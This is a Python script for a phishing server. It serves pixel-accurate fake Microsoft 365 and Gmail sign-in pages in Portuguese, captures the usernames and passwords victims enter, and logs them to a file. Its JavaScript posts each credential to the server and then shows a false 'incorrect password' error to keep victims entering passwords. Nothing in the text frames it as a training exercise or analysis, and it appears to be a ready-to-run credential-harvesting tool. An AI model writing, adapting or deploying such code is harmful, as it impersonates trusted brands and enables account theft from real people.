#!/usr/bin/env python3
"""Fake Microsoft 365 login server - standalone HTTP server on port 80
Serves a pixel-perfect replica of Microsoft's login page (two-step form flow).
Captures submitted credentials to creds_found.txt.
"""
...
.input-wrap input::placeholder{color:#8c8c8c}
.input-wrap label{display:block;font-size:.75rem;font-weight:600;color:#1b1b1b;margin-bottom:4px}
.btn{display:block;width:auto;min-width:108px;padding:6px 20px;background:#0067b8;color:#fff;border:none;font-size:.9375rem;font-weight:600;cursor:pointer;float:right;margin-top:16px;line-height:1.2}
...
#step2{display:none}
.back-link{display:inline-block;color:#0067b8;font-size:.8125rem;text-decoration:none;margin-bottom:20px;cursor:pointer}
.back-link:hover{text-decoration:underline}
.footer{position:relative;z-index:1;margin-top:24px;text-align:center;font-size:.75rem;color:#8c8c8c}
.footer a{color:#5e5e5e;text-decoration:none;padding:0 12px}
.footer a:hover{text-decoration:underline}
@media(max-width:500px){.card{padding:24px 20px 28px}.btn{width:100%;float:none}}
</style></head>
<body>
<div class="bg-shapes"><svg viewBox="0 0 1440 900" preserveAspectRatio="xMidYMid slice">
...
<path fill="url(#g2)" d="M0 350 Q 250 200,550 300 T 1050 250 T 1440 300 L 1440 900 L 0 900Z" opacity=".4"/></svg></div>
<div class="logo-area"><div class="ms-logo">
...
<div class="ms-logo-text">Microsoft</div></div></div>
<div class="card" id="card">
<div id="step1">
<h1>Entrar</h1>
<p class="subtitle">Use sua conta corporativa ou de estudante</p>
<div class="error" id="error1" style="display:none">
<div class="error-msg"><div class="error-icon">!</div><span id="error1Text">Nao foi possivel encontrar uma conta com este endereco de e-mail</span></div></div>
<div class="input-wrap"><label for="username">E-mail, telefone ou Skype</label>
<input type="text" id="username" name="username" placeholder="nome@exemplo.com" autocomplete="username" autocorrect="off" autocapitalize="off" spellcheck="false"></div>
<div style="clear:both"></div><div class="loading" id="loading1">Verificando...</div>
<button type="button" class="btn" id="btnStep1">Entrar</button>
<div class="links"><a href="#" id="forgotLink">Nao consegue acessar sua conta?</a><a href="#" class="signup">Criar uma conta!</a></div></div>
<div id="step2">
<div style="margin-bottom:4px"><a class="back-link" id="backBtn">&larr; Voltar</a></div>
<h1>Entrar</h1><p class="subtitle" id="userDisplay">nome@exemplo.com</p>
<div class="error" id="error2" style="display:none">
<div class="error-msg"><div class="error-icon">!</div><span id="error2Text">Sua conta ou senha esta incorreta. <a href="#" style="color:#0067b8;text-decoration:underline">Redefina-a agora</a>.</span></div></div>
<div class="input-wrap"><label for="password">Senha</label>
<input type="password" id="password" name="password" placeholder="Senha" autocomplete="current-password"></div>
<div style="clear:both"></div><div class="loading" id="loading2">Entrando...</div>
<button type="button" class="btn" id="btnStep2">Entrar</button>
<div class="links"><a href="#" id="forgotLink2">Nao consegue acessar sua conta?</a></div></div></div>
<div class="footer"><a href="#">Termos de uso</a><span class="pipe">|</span><a href="#">Privacidade e cookies</a><span class="pipe">|</span><a href="#">Microsoft (c) 2026</a></div>
<script>
function q(e){return document.getElementById(e)}
var s1=q('step1'),s2=q('step2'),u=q('username'),p=q('password'),b1=q('btnStep1'),b2=q('btnStep2'),e1=q('error1'),e2=q('error2'),et1=q('error1Text'),et2=q('error2Text'),l1=q('loading1'),l2=q('loading2'),ud=q('userDisplay'),ef='';
function ss2(e){ef=e;ud.textContent=e;s1.style.display='none';s2.style.display='block';e2.style.display='none';l2.style.display='none';p.value='';p.focus();}
function ss1(){s2.style.display='none';s1.style.display='block';e1.style.display='none';l1.style.display='none';u.focus();}
b1.onclick=function(){var e=u.value.trim();if(!e){et1.textContent='Digite um endereco de e-mail, telefone ou nome do Skype.';e1.style.display='block';return;}
e1.style.display='none';l1.style.display='block';b1.disabled=true;var x=new XMLHttpRequest();
x.open('POST','/',true);x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
x.onload=function(){l1.style.display='none';b1.disabled=false;ss2(e);};
x.onerror=function(){l1.style.display='none';b1.disabled=false;ss2(e);};
x.send('step=1&username='+encodeURIComponent(e));};
u.onkeydown=function(e){if(e.key==='Enter')b1.click();};
p.onkeydown=function(e){if(e.key==='Enter')b2.click();};
b2.onclick=function(){var pwd=p.value.trim();if(!pwd){et2.innerHTML='Digite sua senha.';e2.style.display='block';return;}
e2.style.display='none';l2.style.display='block';b2.disabled=true;var x=new XMLHttpRequest();
x.open('POST','/',true);x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
x.onload=function(){l2.style.display='none';b2.disabled=false;et2.innerHTML='Sua conta ou senha esta incorreta. <a href=\"' + '#' + '\" style=\"color:#0067b8;text-decoration:underline\">Redefina-a agora</a>.';e2.style.display='block';};
x.onerror=function(){l2.style.display='none';b2.disabled=false;et2.innerHTML='Sua conta ou senha esta incorreta.';e2.style.display='block';};
x.send('step=2&username='+encodeURIComponent(ef)+'&password='+encodeURIComponent(pwd));};
q('backBtn').onclick=ss1;q('forgotLink').onclick=function(e){e.preventDefault();alert('Redefinicao de senha: consulte seu administrador de TI');};
q('forgotLink2').onclick=function(e){e.preventDefault();alert('Redefinicao de senha: consulte seu administrador de TI');};
setTimeout(function(){u.focus();},100);
</script></body></html>"""

GMAIL_PAGE = """<!DOCTYPE html>
<html lang="pt-BR">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
...
<div class="input-group"><input type="email" id="gmail_user" name="username" placeholder="E-mail ou telefone" autocomplete="username" required></div>
<div class="input-group"><input type="password" id="gmail_pass" name="password" placeholder="Senha" autocomplete="current-password" required></div>
<button type="submit" class="btn">Proxima</button>
<div class="error" id="gmailError">Nao foi possivel encontrar sua conta Google</div>
</form>
<div class="links"><a href="#">Criar conta</a></div>
</div>
...
class H(http.server.BaseHTTPRequestHandler):
    ...
    def do_POST(self):
        ...
        print(f"\n[FAKE_LOGIN] {self.client_address[0]}: {b}\n", flush=True)
...
if __name__ == "__main__":
    ...
    print(f"[+] Fake login server: http://0.0.0.0:80")
    print(f"[+] Gmail login:      http://0.0.0.0:80/gmail")
    print(f"[+] Creds logged to:  {CREDS_LOG}")
